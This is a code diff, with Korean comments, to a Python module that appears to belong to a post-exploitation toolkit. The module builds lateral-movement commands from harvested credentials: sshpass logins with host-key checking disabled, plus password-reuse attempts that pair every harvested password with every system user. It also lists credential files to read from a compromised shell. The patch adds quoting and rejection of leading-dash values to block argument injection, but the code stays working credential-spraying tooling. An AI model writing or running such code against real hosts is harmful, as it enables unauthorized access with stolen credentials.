@@ -13,8 +13,16 @@
 from __future__ import annotations
 
 import re
+import shlex
 
 from .creds_harvest import harvest, is_safe_for_cmd
+
+
+def _arg_ok(val: str) -> bool:
+    """명령 인자로 안전한지 — 셸 인젝션 방지(is_safe_for_cmd)에 더해, 선행 '-' 를 막아
+    ssh/sshpass 가 값을 '옵션'(예: -oProxyCommand=…)으로 오인하는 인자 인젝션까지 차단한다.
+    lateral.py 와 동일하게 실제 주입은 shlex.quote 로 한 번 더 감싼다(심층 방어)."""
+    return is_safe_for_cmd(val) and not val.startswith("-")
 
 # 제품별로 발판 셸에서 읽어볼 설정/자격 파일(상대·절대 혼재 — 경로는 머신마다 다를 수 있음).
 _CONFIG_FILES: dict[str, list[str]] = {
@@ -88,10 +96,10 @@ def lateral_candidates(creds: list[tuple[str, str]], users: list[str],
     셸 인젝션 안전값만 명령에 넣는다(신뢰불가 출처 방어). 실행은 사용자 몫."""
     cmds: list[str] = []
     seen: set[str] = set()
-    pw_pool = {p for _, p in creds if is_safe_for_cmd(p)}
+    pw_pool = {p for _, p in creds if _arg_ok(p)}
     login_users = []
     for u in [u for u, _ in creds] + list(users):
-        if u and u not in login_users and is_safe_for_cmd(u):
+        if u and u not in login_users and _arg_ok(u):
             login_users.append(u)
 
     def _add(c: str) -> None:
@@ -99,13 +107,17 @@ def lateral_candidates(creds: list[tuple[str, str]], users: list[str],
             seen.add(c)
             cmds.append(c)
 
-    tgt = target or "<타겟 IP>"
+    tgt = shlex.quote(target or "<타겟 IP>")
+
+    def _ssh(p: str, u: str) -> str:
+        return (f"sshpass -p {shlex.quote(p)} ssh -o StrictHostKeyChecking=no "
+                f"{shlex.quote(u)}@{tgt} id")
     # 1) 자격 그대로
     for u, p in creds:
-        if is_safe_for_cmd(u) and is_safe_for_cmd(p):
-            _add(f"sshpass -p {p} ssh -o StrictHostKeyChecking=no {u}@{tgt} id")
+        if _arg_ok(u) and _arg_ok(p):
+            _add(_ssh(p, u))
     # 2) 비번 재사용(교차) — 자격 유저 아닌 시스템 유저에도
     for p in sorted(pw_pool):
         for u in login_users:
-            _add(f"sshpass -p {p} ssh -o StrictHostKeyChecking=no {u}@{tgt} id")
+            _add(_ssh(p, u))
     return cmds
